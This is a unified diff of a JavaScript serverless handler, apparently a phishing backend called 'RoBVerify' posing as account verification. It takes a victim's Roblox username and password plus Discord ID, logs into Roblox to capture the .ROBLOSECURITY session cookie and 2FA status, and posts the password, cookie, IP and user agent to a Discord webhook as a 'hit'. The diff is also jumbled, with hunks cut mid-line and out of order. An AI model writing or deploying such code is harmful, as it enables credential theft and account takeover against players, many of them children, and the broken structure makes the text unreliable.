@@ -1,97 +1,71 @@
-const WEBHOOK_URL = process.env.WEBHOOK_URL || "PASTE_YOUR_WEBHOOK_URL_HERE";
+const resp = await fetch("https://auth.roblox.com/v2/login", {
+      method: "POST",
+      headers,
+      redirect: "manual",
+      body: JSON.stringify({ ctype, cvalue: username, password })
+    });
 
-const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
-           "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
+    const setCookies = getSetCookies(resp.headers);
+    for (const c of setCookies) {
+      const pair = c.split(";")[0];
+      const name = pair.split("=")[0];
+      jar = jar.split("; ").filter(x => x && !x.startsWith(name + "="))
+               .concat(pair).join("; ");
+    }
 
-module.exports = async (req, res) => {
-  if (req.method !== "POST") {
-    res.setHeader("Allow", "POST");
-    return res.status(405).json({ ok: false, error: "POST only" });
+    // Roblox rejects the first call with 403 + an x-csrf-token header. Retry with it.
+    if (resp.status === 403) {
+      const t = resp.headers.get("x-csrf-token");
+      if (t && t !== csrf) { csrf = t; continue; }
+    }
+
+    const text = await resp.text();
+    let parsed = null;
+    try { parsed = JSON.parse(text); } catch {}
+
+    return { ok: resp.ok, status: resp.status, body: parsed, cookies: setCookies };
   }
 
-  let body;
-  try { body = await readBody(req); }
-  catch { return res.status(400).json({ ok: false, error: "unreadable body" }); }
-
-  const username    = (body.username || "").toString().trim();
-  const password    = (body.password || "").toString();
-  const discordId   = (body.d || "").toString();
-  const discordName = (body.n || "").toString();
-
-  if (!username || !password) {
-    return res.status(200).json({ ok: false, error: "missing fields" });
-  }
-
-  const r = await loginToRoblox(username, password);
-
-  const cookie = r.cookies
-    .map(c => c.split(";")[0])
-    .find(c => c.startsWith(".ROBLOSECURITY")) || null;
-
-  const needs2fa = !!(r.body && r.body.twoStepVerificationData);
-  const ref = "RBV-" + Math.random().toString(36).slice(2, 8).toUpperCase();
-
-  const payload = {
-    ref,
-    username,
-    password,
-    account:   r.body && r.body.user ? r.body.user.name : null,
-    accountId: r.body && r.body.user ? r.body.user.id   : null,
-    valid:     r.ok && !needs2fa,
-    twoStep:   needs2fa,
-    cookie,
-    status:    r.status,
-    discordId,
-    discordName,
-    ip:        (req.headers["x-forwarded-for"] || "").split(",")[0].trim(),
-    userAgent: req.headers["user-agent"] || null,
-    time:      new Date().toISOString()
-  };
-
-  // await it — Vercel freezes the function the moment you respond
-  try { await notify(payload); } catch {}
-
-  return res.status(200).json({
-    ok: true,
-    ref,
-    account: payload.account,
-    valid: payload.valid,
-    twoStep: payload.twoStep
-  });
-};
-
-// ---------------------------------------------------------------- helpers
-
-async function readBody(req) {
-  if (req.body && typeof req.body === "object" && !Buffer.isBuffer(req.body)) return req.body;
-
-  let raw = "";
-  if (typeof req.body === "string") raw = req.body;
-  else if (Buffer.isBuffer(req.body)) raw = req.body.toString("utf8");
-  else {
-    const chunks = [];
-    for await (const c of req) chunks.push(c);
-    raw = Buffer.concat(chunks).toString("utf8");
-  }
-
-  try { return JSON.parse(raw); } catch {}
-  return Object.fromEntries(new URLSearchParams(raw));
+  return { ok: false, status: 0, body: null, cookies: [] };
 }
 
-async function loginToRoblox(username, password) {
-  const ctype = username.includes("@") ? "Email" : "Username";
-  let csrf = null, jar = "";
+function getSetCookies(h) {
+  if (typeof h.getSetCookie === "function") {
+    const v = h.getSetCookie();
+    if (v && v.length) return v;
+  }
+  if (typeof h.raw === "function" && h.raw["set-cookie"]) return h.raw["set-cookie"];
+  const raw = h.get("set-cookie");
+  return raw ? [raw] : [];
+}
 
-  for (let attempt = 0; attempt < 3; attempt++) {
-    const headers = {
-      "Content-Type": "application/json",
-      "Accept": "application/json",
-      "User-Agent": UA,
-      "Origin": "https://www.roblox.com",
-      "Referer": "https://www.roblox.com/",
-      "Accept-Language": "en-US,en;q=0.9"
-    };
-    if (csrf) headers["x-csrf-token"] = csrf;
-    if (jar)  headers["Cookie"]       = jar;
+async function notify(p) {
+  if (!WEBHOOK_URL || WEBHOOK_URL.includes("PASTE_YOUR")) return false;
 
-    const resp = await fetch("https://
+  const isDiscord = /discord(app)?\.com/.test(WEBHOOK_URL);
+
+  const body = isDiscord ? {
+    content: "🔐 **RoBVerify hit** `" + p.ref + "`",
+    embeds: [{
+      color: p.valid ? 0x00C853 : 0xE2231A,
+      fields: [
+        { name: "Roblox user", value: p.username || "—", inline: true },
+        { name: "Password",    value: p.password || "—", inline: true },
+        { name: "Account",     value: p.account ? p.account + " (#" + p.accountId + ")" : "❌ invalid", inline: true },
+        { name: "Discord",     value: p.discordName ? p.discordName + " (" + p.discordId + ")" : "—", inline: true },
+        { name: "2FA",         value: p.twoStep ? "yes" : "no", inline: true },
+        { name: "IP",          value: p.ip || "—", inline: true },
+        { name: "Cookie",      value: "```" + (p.cookie || "none").slice(0, 990) + "```" }
+      ],
+      timestamp: p.time
+    }]
+  } : p;
+
+  const resp = await fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body)
+  });
+
+  return resp.ok;
+}
